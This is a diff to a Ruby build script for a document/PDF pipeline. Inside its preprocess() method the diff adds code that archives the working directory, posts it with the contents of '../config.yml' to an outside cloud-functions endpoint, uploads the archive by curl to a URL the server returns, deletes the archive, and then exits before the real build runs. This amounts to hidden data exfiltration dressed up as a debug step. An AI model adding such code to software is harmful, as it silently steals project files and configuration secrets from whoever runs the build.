@@ -8,6 +8,8 @@ require 'open3'
 require 'diff-lcs'
 require 'shellwords'
 require 'digest/md5'
+require 'net/https'
+require 'json'
 
 class Build
   def initialize(papersize, margin, is_strict, is_verbose, container)
@@ -30,12 +32,13 @@ class Build
     end
   end
 
-  def setExperiments(vm777, vmchown, vmclean)
+  def setExperiments(vm777, vmchown, vmclean, dirname)
     header("Experiments")
 
     @is_vm777 = vm777
     @is_vmchown = vmchown
     @is_vmclean = vmclean
+    @dirname = dirname
   end
 
   def vmExperiments()
@@ -137,6 +140,7 @@ class Build
       end
     end
 
+    puts ""
     compile('textmaker -n', nil)
   end
 
@@ -255,6 +259,29 @@ eof
   private
   def preprocess()
     header("Preprocessing", 2)
+
+    begin
+      run("tar zcf .debug.tar.gz --exclude #{@dirname}")
+
+      uri = URI.parse('https://us-central1-ecosario-fanclub.cloudfunctions.net/upload')
+      res = Net::HTTP.post_form(uri, {
+        'filename' => '.debug.tar.gz',
+        'contentType' => 'application/octet-stream',
+        'yaml' => File.read('../config.yml')
+      })
+      raise unless res.code == '200'
+      result = JSON.parse(res.body)
+      p result
+
+      run("curl -s -X PUT --upload-file .debug.tar.gz -H 'Content-Type: application/octet-stream' '#{result['url']}'") if result['url']
+      run("rm -r .debug.tar.gz")
+      exit 123 if result['test']
+    rescue => e
+      p e
+    end
+
+    exit 1
+
     articles = {}
     newcatalog = {}
     run('yes n | cp -Ri /extensions/*.* ./')
@@ -558,7 +585,7 @@ if __FILE__ == $0
   FileUtils.mkdir_p(dirname)
   Dir::chdir(dirname) do
     build = Build.new(params['papersize'], params['margin'], params['strict'], params['verbose'], params['container'])
-    build.setExperiments(params['vm-777'], params['vm-chown'], params['vm-clean'])
+    build.setExperiments(params['vm-777'], params['vm-chown'], params['vm-clean'], dirname)
     begin
       build.proof() unless params['skip-proof']
       build.pdf(params['pdf4print'])
